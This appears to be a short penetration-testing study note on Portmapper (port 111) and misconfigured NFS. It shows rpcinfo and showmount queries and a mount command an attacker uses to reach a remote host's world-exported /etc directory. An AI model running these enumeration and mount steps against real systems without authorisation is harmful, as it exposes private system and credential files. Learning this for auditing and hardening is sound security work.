    # Portmapper: 111 (TCP)


    RPC (remote procedure call)-based services such as NIS (Network Information Service)
    do not listen on static ports. These services register their port numbers by the
    Portmapper.


    > The Portmapper can be queried for the RPC services registered with it using
    the rpcinfo command: rpcinfo -p hostname.


    Misconfigurations NFS is a protocol that provides remote access to shared files
    across networks. Misconfigured NFS installations allow unauthenticated users to
    access network shares that store critical or private data.


    # Query for and Mount Remote NFS Shares


    Use the showmount command to query a remote host for NFS shares:

    [bash]$ /usr/sbin/showmount --all sun1.somecompanyasanexample.com

    All points on sun1.somecompanyasanexample.com:

    all:/etc


    In this example, sun1.somecompanyasanexample.com was misconfigured to share its
    /etc directory with everyone. An attacker can mount the /etc directory:


    ```

    [bash]$ mount -t NFS sun1.somecompanyasanexample.com:/etc /mnt/etc

    ```'
